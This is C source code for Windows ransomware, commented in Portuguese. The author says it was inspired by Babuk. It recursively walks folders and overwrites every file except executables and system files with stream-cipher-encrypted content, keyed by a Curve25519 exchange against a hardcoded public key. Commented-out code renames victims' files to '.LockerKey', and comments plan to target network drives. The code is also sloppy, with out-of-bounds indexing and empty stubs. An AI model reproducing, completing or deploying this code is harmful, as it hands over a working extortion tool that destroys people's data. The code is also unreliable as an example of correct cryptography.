#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <dirent.h>
#include "curve25519-donna.h"
#include <bcrypt.h>
#include <ntsecapi.h>
#include "sha512.h"
#include <locale.h>
#include "ecrypt-sync.h"
#include <bcrypt.h>









//funçao de derivaçao de chave use na criptografia simetrica
int m_publ[32] = {
        8,  8,  6,  4,  4,  4,  4,  4,  5,  0,
        'n',  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00
};



void FwriteKey(char *path){}//iscrece a chave publica

const  char C[ 32 ] = { 9 };//Bse
 //nao use a mesma  chave para cada amostra e vitima//queremos ter  2^256 chaves possivesi
void cipherxor(BYTE *buffer,int len,BYTE *key){
int    j=0;

 for(int i = 0; i <= len; i++){

buffer[i]=buffer[i]^=key[i];

    }

//segredo compartilhado
}//usaremos o segredo co
BYTE generatPrivateKey(BYTE *key){
    HCRYPTPROV  hCryptProv;
 memset (key, 0, 32);


 if( RtlGenRandom(key,32)==FALSE){
    printf("erro");
}


return(key[32]);


}



VOID Encrypt_File(char *name){
HCRYPTPROV  hCryptProv;
BYTE pbDataSecrete[ 32];
BYTE pbDataPublic[ 32];
BYTE pbShare[ 32];
BYTE pbShareDest[ 32];
generatPrivateKey(pbDataSecrete);
int i=0;
for(i=0;i<=32;i++){

    printf("%d",pbDataSecrete[i]);
}
pbDataSecrete[0] &= 248;
                    pbDataSecrete[31] &= 127;
                    pbDataSecrete[31] |= 64;
                    curve25519_donna(&pbDataPublic,   &pbDataSecrete[ 32], &C);
                    curve25519_donna(&pbShare,   &pbDataSecrete[ 32], &m_publ);
                   //SHA512Hash((uint8_t)&pbShare,32);
                   memset(&pbDataSecrete,0,32);//zeremos a chave privada
BYTE k[32];
BYTE *nonce="100116649696923968170152204148972049320091145701181271883417257213772402812516828";
sha512(pbShare,32,k);
  ECRYPT_ctx ctx;
   ECRYPT_init();       //zfaça o hash
ECRYPT_keysetup(&ctx, k, 256, 256);
 ECRYPT_ivsetup(&ctx, nonce);

FILE *fin = fopen(name, "rb");//abrimos o arquivo
    fseek(fin, 0, SEEK_END);//
    long len = ftell(fin);
    rewind(fin);//reposiciona o ponteiro  para o iicio
    BYTE *buffer =(BYTE*) malloc(len);
    //aloca



    fread(buffer, len, 1, fin);//Ler o conteudo do arquivo
ECRYPT_encrypt_bytes(&ctx,buffer,buffer,len);
memset((BYTE*)&ctx,0,sizeof (ECRYPT_ctx));

memset(k,0,32);
memset(pbShare,0,32);
memset(pbDataSecrete,0,32);
//   cipherxor(buffer,len,shared_secrete);
     FILE *fout = fopen(name, "wb");//Substituimos o arquivo e iscrevemos os dados criptogrados
    fwrite(buffer, len, 1, fout);
    fclose(fout);
free(buffer);

    /*CHAR newname[MAX_PATH];
	strcpy(newname,name);
	strcat(newname,".LockerKey");
	MoveFile(name,newname);*////Renomeamos e mudamos a extensao dos nosso arquivos







}
VOID ListDirFile(char *path){
char sc[MAX_PATH],buf[MAX_PATH];
	 WIN32_FIND_DATA in;
	 HANDLE fd,file;
	 char *fm = "%s\\%s",*fm1 = "%s\\*.*";

	 if(strlen(path) == 3)
	 {
		path[2] = '\0'; /* :-) */
	 }

	 sprintf(sc,fm1,path);
     fd = FindFirstFile(sc,&in);

 do
 {

	 sprintf(buf,fm,path,in.cFileName);

	   /* dot :) */
	 if(strcmp(in.cFileName,"..") != 0 && strcmp(in.cFileName,".") != 0 && (in.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
	 {
		 ListDirFile(buf);
	 }

	   /* File found */
	 else
	 {

		 /* is it good to encrypt ? */

		 if(  !strstr(in.cFileName,".LockerKey")  &&  !strstr(in.cFileName,".dll")
			 && !strstr(in.cFileName,".exe") && !strstr(in.cFileName,".ini") &&
			     !strstr(in.cFileName,".vxd") && !strstr(in.cFileName,".drv") &&
				 strcmp(in.cFileName,"..") != 0 && strcmp(in.cFileName,".") != 0)
		 {
			 Encrypt_File(buf);
		 }
	 }

 }while(FindNextFile(fd,&in));

 FindClose(fd);
}




VOID GetDrives(){





}//Vamos Obter as Unidades Logicas e Remotas e depois criptograflas

VOID Recursive_List_dir();






int main(){


  ListDirFile("C:\\Users\\estan\\OneDrive\\Documentos\\Nova pasta (3)");



//ListDirFile(L"C:\\Users\\estan\\OneDrive\\Documentos\\Nova pasta (3)");

BYTE *nonce="100116649696923968170152204148972049320091145701181271883417257213772402812516828";


printf("%d",nonce);



return 0;}
//Autor Hackerxploitation  ispirado nobabuuk ransoware
